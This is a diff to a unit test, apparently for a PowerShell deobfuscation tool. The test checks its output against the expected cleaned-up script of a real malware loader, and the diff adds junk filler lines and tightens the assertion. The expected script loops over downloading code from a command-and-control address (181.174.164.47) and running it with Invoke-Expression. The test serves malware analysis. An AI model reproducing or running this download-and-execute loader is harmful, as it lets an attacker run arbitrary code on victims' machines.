@@ -791,9 +791,15 @@ class TestPs1RealWorldLarge(TestUnitBase):
         goal = inspect.cleandoc(
             """
             $ppvvglp = New-Object -Com "Scripting.FileSystemObject"
+            function Galaxy {
+              return (Get-Random).ToString() + "RandomText"
+            }
             $Null = New-Object -Com "WScript.Shell"
             $aefqnhv = $ppvvglp.GetDrive("c:").SerialNumber
             $oysdesi = New-Object Threading.Mutex ($False, $aefqnhv)
+            function Comet {
+              return (Get-Random -Minimum 0 -Maximum 2) -Eq 1
+            }
             $Null = $oysdesi.WaitOne(1)
             $aefqnhv = "{0:X}" -f $aefqnhv
             $aefqnhv = [Convert]::ToInt64($aefqnhv, 16)
@@ -804,11 +810,18 @@ class TestPs1RealWorldLarge(TestUnitBase):
               try {
                 $hnuzhmo = $xaumbtf.DownloadString($url)
               } catch {
+                $Null = [Math]::Sqrt(36)
+                (Get-Random).GetHashCode() | Out-Null
                 Start-Sleep -s 5
+                $Null = [array]::Reverse((1, 2, 3, 4))
+                $Null = Get-Process | Select-Object -First 1
                 continue
               }
               Invoke-Expression $hnuzhmo
               Start-Sleep -s 5
+              $Null = -Join ((97..122) | Get-Random -Count 5 | ForEach-Object {
+                [char]$_
+              })
             }
             $oysdesi.ReleaseMutex()
             $oysdesi.Dispose()
@@ -816,7 +829,7 @@ class TestPs1RealWorldLarge(TestUnitBase):
         ).replace('[[C2]]', '181.174.164''.47')
 
         test = data | self.load() | str
-        self.assertIn(goal, test)
+        self.assertEqual(test, goal)
 
     def test_script_requiring_better_bloat_detection(self):
         data = self.download_sample('baa48c748d58d0c715fc2b7fbe74610213c070814762a2774cc6d57d4522a73d')
